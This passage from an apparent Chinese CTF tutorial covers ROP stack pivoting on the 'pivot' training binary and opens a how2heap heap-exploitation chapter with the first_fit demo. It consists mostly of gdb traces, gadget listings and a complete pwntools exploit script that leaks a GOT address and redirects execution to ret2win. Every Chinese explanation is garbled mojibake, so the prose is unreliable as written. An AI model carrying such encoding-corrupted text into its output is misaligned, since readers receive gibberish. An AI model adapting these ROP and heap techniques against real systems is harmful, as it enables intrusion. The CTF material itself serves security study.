gdb-peda$ x/10w 0xf755cf0c
0xf755cf0c:     0x00000000      0x080485f0      0x080488c0      0x0804a024
0xf755cf1c:     0x080488c4      0x08048571      0x000001f7      0x080488c7
0xf755cf2c:     0x080486a3      0x0000000a
</code></pre>
<p>æ‰§è¡Œç¬¬ä¸€æ¬¡ leave;ret ä¹‹å‰ï¼Œæˆ‘ä»¬çœ‹åˆ° EBP æŒ‡å‘ fake ebpï¼Œå³ <code>0xf755cf0c</code>ï¼Œfake ebp æŒ‡å‘ ä¸»payload çš„ ebpï¼Œè€Œåœ¨ fake ebp åŽé¢æ˜¯ leave;ret çš„åœ°å€ <code>0x0804889f</code>ï¼Œå³è¿”å›žåœ°å€ã€‚</p>
<p>æ‰§è¡Œç¬¬ä¸€æ¬¡ leaveï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EBX: 0x0
ECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EDX: 0xf7731860 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --&gt; 0x0
ESP: 0xffe7ec6c --&gt; 0x804889f (&lt;pwnme+173&gt;:     leave)
EIP: 0x80488a0 (&lt;pwnme+174&gt;:    ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10
   0x804889e &lt;pwnme+172&gt;:       nop
   0x804889f &lt;pwnme+173&gt;:       leave  
=&gt; 0x80488a0 &lt;pwnme+174&gt;:       ret
   0x80488a1 &lt;uselessFunction&gt;: push   ebp
   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp
   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8
   0x80488a7 &lt;uselessFunction+6&gt;:       call   0x80485f0 &lt;foothold_function@plt&gt;
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec6c --&gt; 0x804889f (&lt;pwnme+173&gt;:    leave)
0004| 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0
0008| 0xffe7ec74 --&gt; 0x0
0012| 0xffe7ec78 --&gt; 0x2
0016| 0xffe7ec7c --&gt; 0x0
0020| 0xffe7ec80 --&gt; 0x1
0024| 0xffe7ec84 --&gt; 0xffe7ed44 --&gt; 0xffe808cf (&quot;./pivot32&quot;)
0028| 0xffe7ec88 --&gt; 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
</code></pre>
<p>EBP çš„å€¼ <code>0xffe7ec68</code> è¢«èµ‹å€¼ç»™ ESPï¼Œç„¶åŽä»Žæ ˆä¸­å¼¹å‡º <code>0xf755cf0c</code>ï¼Œå³ fake ebp å¹¶èµ‹å€¼ç»™ EBPï¼ŒåŒæ—¶ ESP+4=<code>0xffe7ec6c</code>ï¼ŒæŒ‡å‘ç¬¬äºŒæ¬¡çš„ leaveã€‚</p>
<p>æ‰§è¡Œç¬¬ä¸€æ¬¡ retï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EBX: 0x0
ECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EDX: 0xf7731860 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --&gt; 0x0
ESP: 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0
EIP: 0x804889f (&lt;pwnme+173&gt;:    leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048896 &lt;pwnme+164&gt;:       call   0x80485b0 &lt;fgets@plt&gt;
   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10
   0x804889e &lt;pwnme+172&gt;:       nop
=&gt; 0x804889f &lt;pwnme+173&gt;:       leave  
   0x80488a0 &lt;pwnme+174&gt;:       ret
   0x80488a1 &lt;uselessFunction&gt;: push   ebp
   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp
   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec70 --&gt; 0xf755000a --&gt; 0x0
0004| 0xffe7ec74 --&gt; 0x0
0008| 0xffe7ec78 --&gt; 0x2
0012| 0xffe7ec7c --&gt; 0x0
0016| 0xffe7ec80 --&gt; 0x1
0020| 0xffe7ec84 --&gt; 0xffe7ed44 --&gt; 0xffe808cf (&quot;./pivot32&quot;)
0024| 0xffe7ec88 --&gt; 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)
0028| 0xffe7ec8c --&gt; 0xf655d010 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804889f in pwnme ()
</code></pre>
<p>EIP=<code>0x804889f</code>ï¼ŒåŒæ—¶ ESP+4ã€‚</p>
<p>ç¬¬äºŒæ¬¡ leaveï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EBX: 0x0
ECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EDX: 0xf7731860 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;: jmp    DWORD PTR ds:0x804a024)
EIP: 0x80488a0 (&lt;pwnme+174&gt;:    ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804889b &lt;pwnme+169&gt;:       add    esp,0x10
   0x804889e &lt;pwnme+172&gt;:       nop
   0x804889f &lt;pwnme+173&gt;:       leave  
=&gt; 0x80488a0 &lt;pwnme+174&gt;:       ret
   0x80488a1 &lt;uselessFunction&gt;: push   ebp
   0x80488a2 &lt;uselessFunction+1&gt;:       mov    ebp,esp
   0x80488a4 &lt;uselessFunction+3&gt;:       sub    esp,0x8
   0x80488a7 &lt;uselessFunction+6&gt;:       call   0x80485f0 &lt;foothold_function@plt&gt;
[------------------------------------stack-------------------------------------]
0000| 0xf755cf10 --&gt; 0x80485f0 (&lt;foothold_function@plt&gt;:        jmp    DWORD PTR ds:0x804a024)
0004| 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)
0008| 0xf755cf18 --&gt; 0x804a024 --&gt; 0x80485f6 (&lt;foothold_function@plt+6&gt;:        push   0x30)
0012| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])
0016| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0020| 0xf755cf24 --&gt; 0x1f7
0024| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0028| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
gdb-peda$ x/10w 0xf755cf10
0xf755cf10:     0x080485f0      0x080488c0      0x0804a024      0x080488c4
0xf755cf20:     0x08048571      0x000001f7      0x080488c7      0x080486a3
0xf755cf30:     0x0000000a      0x00000000
</code></pre>
<p>EBP çš„å€¼ <code>0xf755cf0c</code> è¢«èµ‹å€¼ç»™ ESPï¼Œå¹¶å°† ä¸»payload çš„ ebp èµ‹å€¼ç»™ EBPï¼ŒåŒæ—¶ ESP+4=<code>0xf755cf10</code>ï¼Œè¿™ä¸ªå€¼æ­£æ˜¯æˆ‘ä»¬ ä¸»payload çš„åœ°å€ã€‚</p>
<p>ç¬¬äºŒæ¬¡ retï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EBX: 0x0
ECX: 0xffe7ec40 ('A' &lt;repeats 40 times&gt;, &quot;\f\317U\367\237\210\004\b\n&quot;)
EDX: 0xf7731860 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;: pop    eax)
EIP: 0x80485f0 (&lt;foothold_function@plt&gt;:        jmp    DWORD PTR ds:0x804a024)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485e0 &lt;exit@plt&gt;:        jmp    DWORD PTR ds:0x804a020
   0x80485e6 &lt;exit@plt+6&gt;:      push   0x28
   0x80485eb &lt;exit@plt+11&gt;:     jmp    0x8048580
=&gt; 0x80485f0 &lt;foothold_function@plt&gt;:   jmp    DWORD PTR ds:0x804a024
 | 0x80485f6 &lt;foothold_function@plt+6&gt;: push   0x30
 | 0x80485fb &lt;foothold_function@plt+11&gt;:        jmp    0x8048580
 | 0x8048600 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a028
 | 0x8048606 &lt;__libc_start_main@plt+6&gt;: push   0x38
 |-&gt;   0x80485f6 &lt;foothold_function@plt+6&gt;:     push   0x30
       0x80485fb &lt;foothold_function@plt+11&gt;:    jmp    0x8048580
       0x8048600 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a028
       0x8048606 &lt;__libc_start_main@plt+6&gt;:     push   0x38
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xf755cf14 --&gt; 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)
0004| 0xf755cf18 --&gt; 0x804a024 --&gt; 0x80485f6 (&lt;foothold_function@plt+6&gt;:        push   0x30)
0008| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])
0012| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0016| 0xf755cf24 --&gt; 0x1f7
0020| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0024| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
0028| 0xf755cf30 --&gt; 0xa ('\n')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485f0 in foothold_function@plt ()
</code></pre>
<p>æˆåŠŸè·³è½¬åˆ° <code>foothold_function@plt</code>ï¼ŒæŽ¥ä¸‹æ¥ç³»ç»Ÿé€šè¿‡ <code>_dl_runtime_resolve</code> ç­‰æ­¥éª¤ï¼Œå°†çœŸæ­£çš„åœ°å€å†™å…¥åˆ° <code>.got.plt</code> ä¸­ï¼Œæˆ‘ä»¬æž„é€  gadget æ³„éœ²å‡ºè¯¥åœ°å€åœ°å€ï¼Œç„¶åŽè®¡ç®—å‡º <code>ret2win()</code> çš„åœ°å€ï¼Œè°ƒç”¨å®ƒï¼Œå°±æˆåŠŸäº†ã€‚</p>
<p>åœ°å€æ³„éœ²çš„è¿‡ç¨‹ï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x54 ('T')
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf18 --&gt; 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:      push   ebp)
EIP: 0x80488c0 (&lt;usefulGadgets&gt;:        pop    eax)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488ba:   xchg   ax,ax
   0x80488bc:   xchg   ax,ax
   0x80488be:   xchg   ax,ax
=&gt; 0x80488c0 &lt;usefulGadgets&gt;:   pop    eax
   0x80488c1 &lt;usefulGadgets+1&gt;: ret
   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax
   0x80488c3 &lt;usefulGadgets+3&gt;: ret
   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xf755cf18 --&gt; 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)
0004| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])
0008| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0012| 0xf755cf24 --&gt; 0x1f7
0016| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0020| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
0024| 0xf755cf30 --&gt; 0xa ('\n')
0028| 0xf755cf34 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c0 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:       mov    eax,DWORD PTR [eax])
EIP: 0x80488c1 (&lt;usefulGadgets+1&gt;:      ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488bc:   xchg   ax,ax
   0x80488be:   xchg   ax,ax
   0x80488c0 &lt;usefulGadgets&gt;:   pop    eax
=&gt; 0x80488c1 &lt;usefulGadgets+1&gt;: ret
   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax
   0x80488c3 &lt;usefulGadgets+3&gt;: ret
   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]
   0x80488c6 &lt;usefulGadgets+6&gt;: ret
[------------------------------------stack-------------------------------------]
0000| 0xf755cf1c --&gt; 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])
0004| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0008| 0xf755cf24 --&gt; 0x1f7
0012| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0016| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
0020| 0xf755cf30 --&gt; 0xa ('\n')
0024| 0xf755cf34 --&gt; 0x0
0028| 0xf755cf38 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c1 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x804a024 --&gt; 0xf7772770 (&lt;foothold_function&gt;:     push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:      pop    ebx)
EIP: 0x80488c4 (&lt;usefulGadgets+4&gt;:      mov    eax,DWORD PTR [eax])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488c1 &lt;usefulGadgets+1&gt;: ret
   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax
   0x80488c3 &lt;usefulGadgets+3&gt;: ret
=&gt; 0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]
   0x80488c6 &lt;usefulGadgets+6&gt;: ret
   0x80488c7 &lt;usefulGadgets+7&gt;: add    eax,ebx
   0x80488c9 &lt;usefulGadgets+9&gt;: ret
   0x80488ca &lt;usefulGadgets+10&gt;:        xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0004| 0xf755cf24 --&gt; 0x1f7
0008| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0012| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
0016| 0xf755cf30 --&gt; 0xa ('\n')
0020| 0xf755cf34 --&gt; 0x0
0024| 0xf755cf38 --&gt; 0x0
0028| 0xf755cf3c --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c4 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xf7772770 (&lt;foothold_function&gt;:   push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --&gt; 0x0
ESI: 0xf772fe28 --&gt; 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:      pop    ebx)
EIP: 0x80488c6 (&lt;usefulGadgets+6&gt;:      ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488c2 &lt;usefulGadgets+2&gt;: xchg   esp,eax
   0x80488c3 &lt;usefulGadgets+3&gt;: ret
   0x80488c4 &lt;usefulGadgets+4&gt;: mov    eax,DWORD PTR [eax]
=&gt; 0x80488c6 &lt;usefulGadgets+6&gt;: ret
   0x80488c7 &lt;usefulGadgets+7&gt;: add    eax,ebx
   0x80488c9 &lt;usefulGadgets+9&gt;: ret
   0x80488ca &lt;usefulGadgets+10&gt;:        xchg   ax,ax
   0x80488cc &lt;usefulGadgets+12&gt;:        xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xf755cf20 --&gt; 0x8048571 (&lt;_init+33&gt;:     pop    ebx)
0004| 0xf755cf24 --&gt; 0x1f7
0008| 0xf755cf28 --&gt; 0x80488c7 (&lt;usefulGadgets+7&gt;:      add    eax,ebx)
0012| 0xf755cf2c --&gt; 0x80486a3 (&lt;deregister_tm_clones+35&gt;:      call   eax)
0016| 0xf755cf30 --&gt; 0xa ('\n')
0020| 0xf755cf34 --&gt; 0x0
0024| 0xf755cf38 --&gt; 0x0
0028| 0xf755cf3c --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c6 in usefulGadgets ()
</code></pre>
<h3 id="pivot">pivot</h3>
<p>åŸºæœ¬åŒä¸Šï¼Œä½†ä½ å¯ä»¥å°è¯•æŠŠä¿®æ”¹ rsp çš„éƒ¨åˆ†ä¹Ÿç”¨ gadgets æ¥å®žçŽ°ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯æˆ‘ä»¬ä¸éœ€è¦ä¼ªé€ ä¸€ä¸ªå †æ ˆï¼Œå³ä¸ç”¨ç®¡ ebp çš„åœ°å€ã€‚å¦‚ï¼š</p>
<pre><code class="language-python">payload_2  = &quot;A&quot; * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)
</code></pre>
<p>å®žé™…ä¸Šï¼Œæˆ‘æœ¬äººæ­£æ˜¯ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå› ä¸ºæˆ‘åœ¨æž„å»º payload æ—¶ï¼Œ<code>0x0000000000400ae0 &lt;+165&gt;: leave</code>ï¼Œleave;ret çš„åœ°å€å­˜åœ¨æˆªæ–­å­—ç¬¦ <code>0a</code>ï¼Œè¿™æ ·å°±ä¸èƒ½é€šè¿‡æ­£å¸¸çš„æ–¹å¼å†™å…¥ç¼“å†²åŒºï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯å¯ä»¥è§£å†³çš„ï¼Œæ¯”å¦‚å…ˆå°† <code>0a</code> æ¢æˆéžæˆªæ–­å­—ç¬¦ï¼Œä¹‹åŽå†ä½¿ç”¨å¯„å­˜å™¨å°† <code>0a</code> å†™å…¥è¯¥åœ°å€ï¼Œè¿™ä¹Ÿæ˜¯é€šå¸¸è§£å†³ç¼“å†²åŒºä¸­æˆªæ–­å­—ç¬¦çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™æ ·åšéš¾åº¦å¤ªå¤§ï¼Œä¸æŽ¨èï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥å°è¯•ä¸€ä¸‹ã€‚</p>
<pre><code class="language-text">$ ropgadget --binary pivot --only &quot;mov|pop|call|add|xchg|ret&quot;
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
0x0000000000400b00 : pop rax ; ret
0x0000000000400900 : pop rbp ; ret
0x0000000000400b02 : xchg rax, rsp ; ret
from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot')
elf = ELF('./pivot')
libp = ELF('./libpivot.so')

leave_ret = 0x0000000000400adf

foothold_plt     = elf.plt['foothold_function'] # 0x400850
foothold_got_plt = elf.got['foothold_function'] # 0x602048

pop_rax      = 0x0000000000400b00
pop_rbp      = 0x0000000000400900
mov_rax_rax  = 0x0000000000400b05
xchg_rax_rsp = 0x0000000000400b02
add_rax_rbp  = 0x0000000000400b09
call_rax     = 0x000000000040098e

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x14e

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1  = p64(foothold_plt)
payload_1 += p64(pop_rax)
payload_1 += p64(foothold_got_plt)
payload_1 += p64(mov_rax_rax)
payload_1 += p64(pop_rbp)
payload_1 += p64(offset)
payload_1 += p64(add_rax_rbp)
payload_1 += p64(call_rax)

io.sendline(payload_1)

# rsp = leakaddr
payload_2  = &quot;A&quot; * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)

io.sendline(payload_2)
print io.recvall()
</code></pre>
<p>è¿™æ ·åŸºæœ¬çš„ ROP ä¹Ÿå°±ä»‹ç»å®Œäº†ï¼Œæ›´é«˜çº§çš„ç”¨æ³•ä¼šåœ¨åŽé¢çš„ç« èŠ‚ä¸­å†ä»‹ç»ï¼Œæ‰€è°“çš„é«˜çº§ï¼Œä¹Ÿå°±æ˜¯ gadgets æž„é€ æ›´åŠ å·§å¦™ï¼Œè¿ç”¨æ“ä½œç³»ç»Ÿçš„çŸ¥è¯†æ›´åŠ åº•å±‚è€Œå·²ã€‚</p>
<h2 id="316-linux">3.1.6 Linux å †åˆ©ç”¨ï¼ˆä¸Šï¼‰</h2>
<ul>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#linux-å †ç®€ä»‹">Linux å †ç®€ä»‹</a></li>
<li>how2heap</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#first_fit">first_fit</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup">fastbin_dup</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_into_stack">fastbin_dup_into_stack</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">fastbin_dup_consolidate</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink">unsafe_unlink</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#house_of_spirit">house_of_spirit</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></li>
</ul>
<h2 id="linux">Linux å †ç®€ä»‹</h2>
<p>å †æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€å—è¿žç»­çš„åŒºåŸŸï¼Œç”±ä½Žåœ°å€å‘é«˜åœ°å€å¢žé•¿ã€‚å½“å‰ Linux ä½¿ç”¨çš„å †åˆ†é…å™¨è¢«ç§°ä¸º ptmalloc2ï¼Œåœ¨ glibc ä¸­å®žçŽ°ã€‚</p>
<p>æ›´è¯¦ç»†çš„æˆ‘ä»¬å·²ç»åœ¨ç« èŠ‚ 1.5.8 ä¸­ä»‹ç»äº†ï¼Œç« èŠ‚ 1.5.7 ä¸­ä¹Ÿæœ‰ç›¸å…³å†…å®¹ï¼Œè¯·å›žé¡¾ä¸€ä¸‹ã€‚</p>
<p>å¯¹å †åˆ©ç”¨æ¥è¯´ï¼Œä¸ç”¨äºŽæ ˆä¸Šçš„æº¢å‡ºèƒ½å¤Ÿç›´æŽ¥è¦†ç›–å‡½æ•°çš„è¿”å›žåœ°å€ä»Žè€ŒæŽ§åˆ¶ EIPï¼Œåªèƒ½é€šè¿‡é—´æŽ¥æ‰‹æ®µæ¥åŠ«æŒç¨‹åºæŽ§åˆ¶æµã€‚</p>
<h2 id="how2heap">how2heap</h2>
<p>how2heap æ˜¯ç”± shellphish å›¢é˜Ÿåˆ¶ä½œçš„å †åˆ©ç”¨æ•™ç¨‹ï¼Œä»‹ç»äº†å¤šç§å †åˆ©ç”¨æŠ€æœ¯ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä»¬å°±é€šè¿‡è¿™ä¸ªæ•™ç¨‹æ¥å­¦ä¹ ã€‚æŽ¨èä½¿ç”¨ Ubuntu 16.04 64ä½ç³»ç»ŸçŽ¯å¢ƒï¼Œglibc ç‰ˆæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped
$ git clone https://github.com/shellphish/how2heap.git
$ cd how2heap
$ make
</code></pre>
<p>è¯·æ³¨æ„ï¼Œä¸‹æ–‡ä¸­è´´å‡ºçš„ä»£ç æ˜¯æˆ‘ç®€åŒ–è¿‡çš„ï¼Œå‰”é™¤å’Œä¿®æ”¹äº†ä¸€äº›ä¸å¿…è¦çš„æ³¨é‡Šå’Œä»£ç ï¼Œä»¥æ–¹ä¾¿å­¦ä¹ ã€‚å¦å¤–ï¼Œæ­£å¦‚ç« èŠ‚ 4.3 ä¸­æ‰€è®²çš„ï¼Œæ·»åŠ ç¼–è¯‘å‚æ•° <code>CFLAGS += -fsanitize=address</code> å¯ä»¥æ£€æµ‹å†…å­˜é”™è¯¯ã€‚<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/3.1.6_heap_exploit">ä¸‹è½½æ–‡ä»¶</a></p>
<h3 id="first_fit">first_fit</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    char* a = malloc(512);
    char* b = malloc(256);
    char* c;

    fprintf(stderr, &quot;1st malloc(512): %p\n&quot;, a);
    fprintf(stderr, &quot;2nd malloc(256): %p\n&quot;, b);
    strcpy(a, &quot;AAAAAAAA&quot;);
    strcpy(b, &quot;BBBBBBBB&quot;);
    fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);

    fprintf(stderr, &quot;Freeing the first one...\n&quot;);
    free(a);

    c = malloc(500);
    fprintf(stderr, &quot;3rd malloc(500): %p\n&quot;, c);
    strcpy(c, &quot;CCCCCCCC&quot;);
    fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);
    fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);
}
$ gcc -g first_fit.c
$ ./a.out
1st malloc(512): 0x1380010
2nd malloc(256): 0x1380220
first allocation 0x1380010 points to AAAAAAAA
Freeing the first one...
3rd malloc(500): 0x1380010
3rd allocation 0x1380010 points to CCCCCCCC
first allocation 0x1380010 points to CCCCCCCC
</code></pre>
